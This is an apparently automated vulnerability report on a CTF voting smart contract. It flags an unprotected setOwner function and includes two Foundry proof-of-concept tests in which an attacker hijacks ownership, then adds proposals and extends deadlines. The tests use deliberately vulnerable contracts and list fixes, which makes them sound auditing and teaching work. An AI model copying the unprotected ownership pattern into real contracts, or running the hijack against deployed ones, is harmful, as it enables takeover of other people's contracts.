# Smart Contract Vulnerability Analysis Report

**Job ID:** 1e480658-f567-417f-8265-978861efdec1
**Date:** 2025-03-21 01:43:40

**Contract Preview:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CTFVoting {
    struct Proposal {
        string description;
        uint256 voteCount;
    }
    
    Proposal[] public proposals;
    mapping(address => bool) public hasVoted;
    address public owner;
    uint256 public votingDeadline;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(uint256 duration, string[] memory proposalDescriptions) {
...
```

## Vulnerability Summary

Found 2 potential vulnerabilities:

| # | Vulnerability Type | Confidence | Affected Functions |
|---|-------------------|------------|--------------------|
| 1 | access_control | 1.00 | setOwner |
| 2 | business_logic | 1.00 | setOwner, addProposal, extendVoting |

## Detailed Analysis

### Vulnerability #1: access_control

**Confidence:** 1.00

**Reasoning:**

The function setOwner is public and lacks any access control checks. This allows any user to call setOwner and assign themselves as the contract owner. This completely breaks the intended ownership structure, allowing an attacker to gain full control over functions that are meant to be owner-only (such as addProposal and extendVoting).

**Validation:**

The setOwner function is completely unprotected by any access control modifier (e.g., onlyOwner). This means any external actor can call setOwner to change the ownership of the contract, which directly violates standard access control practices. Given that ownership controls critical methods like addProposal and extendVoting, this is a critical vulnerability.

**Code Snippet:**

```solidity
function setOwner(address newOwner) public {
        owner = newOwner;
    }
```

**Affected Functions:** setOwner

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment using a local Ethereum blockchain simulator (e.g., Ganache) and deploy the vulnerable contract.
- Step 2: Prepare two accounts: one as the legitimate owner and one as the attacker.

*Execution Steps:*

- Step 1: Demonstrate the normal behavior by showing that functions meant to be owner-only are executed only by the intended owner.
- Step 2: Have the attacker account call setOwner with their own address to demonstrate how they can take over ownership.

*Validation Steps:*

- Step 1: Explain that the lack of access control in setOwner violates the security principle of restricted access, allowing unauthorized users to gain control.
- Step 2: Show how to fix the vulnerability by implementing an access control check (e.g., using a modifier that restricts the call to the current owner) in the setOwner function.

---

### Vulnerability #2: business_logic

**Confidence:** 1.00

**Reasoning:**

The overall design relies on the assumption that ownership is secure so that only the contract deployer can adjust critical parameters like the list of proposals and voting deadline. Due to the unprotected setOwner function, an attacker who takes over ownership can manipulate voting by extending deadlines and adding proposals, effectively compromising the fairness and integrity of the vote.

**Validation:**

Although functions such as addProposal and extendVoting are gated by the onlyOwner modifier, the lack of protection on setOwner allows an attacker to seize ownership and then invoke these privileged functions. This represents a significant business logic flaw because it bypasses the intended protective measures of the contract, thereby undermining the integrity and intended voting process.

**Code Snippet:**

```solidity
function setOwner(address newOwner) public {
        owner = newOwner;
    }

function addProposal(string memory description) public onlyOwner {
        require(block.timestamp < votingDeadline, "Voting ended");
        proposals.push(Proposal({description: description, voteCount: 0}));
    }

function extendVoting(uint256 extraTime) public onlyOwner {
        votingDeadline += extraTime;
    }
```

**Affected Functions:** setOwner, addProposal, extendVoting

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment that simulates the vulnerable contract in a controlled test network.
- Step 2: Deploy the contract and set up two accounts: one as the legitimate owner and one as an attacker.

*Execution Steps:*

- Step 1: Demonstrate normal contract behavior by showing the owner adding proposals and extending the voting deadline as intended.
- Step 2: Show how an attacker can call the unprotected setOwner function from a non-owner account to hijack ownership, then use that new ownership to add proposals and extend voting deadlines.

*Validation Steps:*

- Step 1: Explain that this vulnerability violates the security principle of access control, as the setOwner function lacks proper protection and allows unauthorized ownership changes.
- Step 2: Demonstrate the fix by modifying the contract to include an onlyOwner modifier on the setOwner function, thereby preventing unauthorized changes to ownership.

---

## Proof of Concept Exploits

### PoC #1: access_control

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742492601.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./basetest.sol";

/*
    VulnerableContract demonstrates a common vulnerability where a critical function (setOwner)
    lacks proper access control. In this contract, anyone can call setOwner and change the owner,
    violating the principle of restricted access. This is for educational purposes only.
*/
contract VulnerableContract {
    address public owner;

    // The constructor sets the initial legitimate owner.
    constructor(address _owner) {
        require(_owner != address(0), "Invalid owner");
        owner = _owner;
    }

    /*
        Vulnerable Function: setOwner
        This function allows setting a new owner without checking that the caller is the current owner.
        As a result, an attacker can seize control by calling this function.
    */
    function setOwner(address newOwner) external returns (bool) {
        require(newOwner != address(0), "Invalid new owner");
        owner = newOwner;
        return true;
    }
}

/*
    YourTest extends BaseTestWithBalanceLog (imported via basetest.sol) to demonstrate the vulnerability.
    It sets up a test environment with two accounts: one legitimate owner and one attacker.
    The testExploit function demonstrates how the vulnerable setOwner function can be exploited.
*/
contract YourTest is BaseTestWithBalanceLog {
    VulnerableContract public vulnerable;
    address public owner;
    address public attacker;

    function setUp() public {
        // Ensure the test contract has enough ETH.
        vm.deal(address(this), 100 ether);
        
        // Setup two accounts: one for the legitimate owner and one for the attacker.
        owner = vm.addr(1);
        attacker = vm.addr(2);
        
        // Deploy the vulnerable contract with the legitimate owner.
        vm.prank(owner);
        vulnerable = new VulnerableContract(owner);
    }

    // The balanceLog modifier is used to log ETH balances at the start and end of the test.
    function testExploit() public balanceLog {
        // Ensure the test address has enough ETH.
        vm.deal(address(this), 10 ether);

        // ------------------------------------------------------------------
        // Step 1: Demonstrate normal behavior by having the legitimate owner call setOwner.
        // Even though setOwner is supposed to be owner-only, the vulnerability is not exploited yet.
        // ------------------------------------------------------------------
        vm.prank(owner);
        (bool successOwner, bytes memory dataOwner) = address(vulnerable).call(
            abi.encodeWithSelector(vulnerable.setOwner.selector, owner)
        );
        require(successOwner, "Owner call to setOwner failed");
        require(vulnerable.owner() == owner, "Owner is not set correctly after owner's call");
        emit log_named_address("Owner after legitimate call:", vulnerable.owner());

        // ------------------------------------------------------------------
        // Step 2: Attacker exploits the vulnerability by calling setOwner.
        // Without an access control modifier, the attacker can successfully change the owner.
        // ------------------------------------------------------------------
        vm.prank(attacker);
        (bool successAttack, bytes memory dataAttack) = address(vulnerable).call(
            abi.encodeWithSelector(vulnerable.setOwner.selector, attacker)
        );
        require(successAttack, "Attacker call to setOwner failed");
        require(vulnerable.owner() == attacker, "Attack failed: attacker is not the owner");
        emit log_named_address("Owner after attacker call:", vulnerable.owner());

        /*
            Educational Note:
            The vulnerability stems from the absence of an access control check in setOwner.
            To prevent this kind of vulnerability, always restrict sensitive functions using access
            control modifiers such as onlyOwner. For example:

            modifier onlyOwner() {
                require(msg.sender == owner, "Not authorized");
                _;
            }

            function setOwner(address newOwner) external onlyOwner returns (bool) {
                require(newOwner != address(0), "Invalid new owner");
                owner = newOwner;
                return true;
            }
        */
    }
}
```

---

### PoC #2: business_logic

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742492618.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./basetest.sol";

/// @title VulnerableVoting - A sample contract with an access control vulnerability for educational purposes.
/// @notice This contract simulates a voting mechanism where the owner can add proposals and extend the voting deadline.
///         However, the setOwner function is unprotected and allows any user to hijack ownership.
contract VulnerableVoting {
    address public owner;
    uint256 public deadline;
    string[] public proposals;

    /// @notice Constructor sets the deployer as owner and initializes the voting deadline.
    constructor(uint256 _initialDeadline) {
        owner = msg.sender;
        deadline = _initialDeadline;
    }

    /// @notice Allows the owner to add a proposal.
    /// @param proposal The proposal description.
    function addProposal(string calldata proposal) external {
        require(msg.sender == owner, "Only owner can add proposals");
        proposals.push(proposal);
    }

    /// @notice Allows the owner to extend the voting deadline.
    /// @param newDeadline The new deadline timestamp (must be greater than the current deadline).
    function extendDeadline(uint256 newDeadline) external {
        require(msg.sender == owner, "Only owner can extend the deadline");
        require(newDeadline > deadline, "New deadline must be greater than current deadline");
        deadline = newDeadline;
    }

    /// @notice Vulnerable function: allows ANY user to set the contract's owner.
    /// @param newOwner The address of the new owner.
    function setOwner(address newOwner) external {
        // WARNING: No access control! Any caller can change the owner.
        owner = newOwner;
    }
}


/// @title YourTest - Foundry test contract demonstrating an access control vulnerability in VulnerableVoting.
/// @notice This test demonstrates how an attacker can hijack the ownership by calling setOwner
///         from a non-owner account and then perform privileged actions.
contract YourTest is BaseTestWithBalanceLog {
    VulnerableVoting public vulnerableContract;
    address public legitimateOwner;
    address public attacker;

    // Educational comments:
    // The vulnerability in this contract is that the setOwner function does not restrict who can call it.
    // An attacker can call setOwner from any address to gain control over the contract.
    // To fix this, the developer should add an onlyOwner modifier, e.g.,
    // modifier onlyOwner() {
    //     require(msg.sender == owner, "Not owner");
    //     _;
    // }  
    // and apply it to setOwner.

    function setUp() public {
        // Ensure this contract has enough ETH.
        vm.deal(address(this), 100 ether);

        // Set initial addresses.
        legitimateOwner = address(0xABCD);
        attacker = address(0xDEAD);

        // Fund the legitimate owner and attacker with ETH if needed.
        vm.deal(legitimateOwner, 10 ether);
        vm.deal(attacker, 10 ether);

        // Deploy the VulnerableVoting contract with an initial deadline.
        // We use this contract's address (msg.sender) as deployer, then simulate legitimate ownership transfer.
        vulnerableContract = new VulnerableVoting(block.timestamp + 1 days);

        // For educational demonstration, transfer ownership to the legitimate owner.
        // Although the deployer is initially the owner, we simulate an environment where the legitimate owner takes control.
        vulnerableContract.setOwner(legitimateOwner);
        require(vulnerableContract.owner() == legitimateOwner, "Owner assignment failed in setup");
    }

    /// @notice Test function demonstrating the normal behavior and the vulnerability exploit.
    /// @dev Uses the balanceLog modifier as required.
    function testExploit() public balanceLog {
        // Ensure the test address has enough ETH.
        vm.deal(address(this), 10 ether);

        // -------------------------------
        // Normal Behavior Demonstration
        // -------------------------------
        // As the legitimate owner, add a proposal.
        vm.startPrank(legitimateOwner);
        try vulnerableContract.addProposal("Proposal 1: Increase budget") {
            // accepted
        } catch {
            revert("Legitimate owner failed to add proposal");
        }

        // Extend the voting deadline.
        uint256 newDeadline = vulnerableContract.deadline() + 1 days;
        try vulnerableContract.extendDeadline(newDeadline) {
            // accepted
        } catch {
            revert("Legitimate owner failed to extend deadline");
        }
        vm.stopPrank();

        // -------------------------------
        // Exploitation by an Attacker
        // -------------------------------
        // The attacker calls the unprotected setOwner function to hijack the contract.
        vm.startPrank(attacker);
        try vulnerableContract.setOwner(attacker) {
            // Call succeeded, attacker is now the new owner.
        } catch {
            revert("Attacker failed to hijack ownership");
        }
        vm.stopPrank();

        require(vulnerableContract.owner() == attacker, "Ownership hijack did not occur");

        // As the new owner (attacker), add a malicious proposal.
        vm.startPrank(attacker);
        try vulnerableContract.addProposal("Malicious Proposal: Drain funds") {
            // accepted by attacker now
        } catch {
            revert("Attacker failed to add malicious proposal");
        }

        // And extend the deadline further.
        uint256 attackerDeadline = vulnerableContract.deadline() + 2 days;
        try vulnerableContract.extendDeadline(attackerDeadline) {
            // accepted
        } catch {
            revert("Attacker failed to extend deadline");
        }
        vm.stopPrank();

        // -------------------------------
        // Validation and Educational Fix Demonstration
        // -------------------------------
        // The vulnerability violates the principle of proper access control.
        // To fix this issue, developers should add an onlyOwner modifier to setOwner.
        // Example fix:
        //   function setOwner(address newOwner) external onlyOwner {
        //       owner = newOwner;
        //   }
    }
}
```

---

## Recommendations

For each identified vulnerability, consider implementing the following mitigations:

- **For Access Control**: Implement proper authorization checks and use the Ownable pattern.
- **For All Vulnerabilities**: Consider a professional audit before deploying to production.

*This report was generated automatically by the Smart Contract Vulnerability Analyzer.*
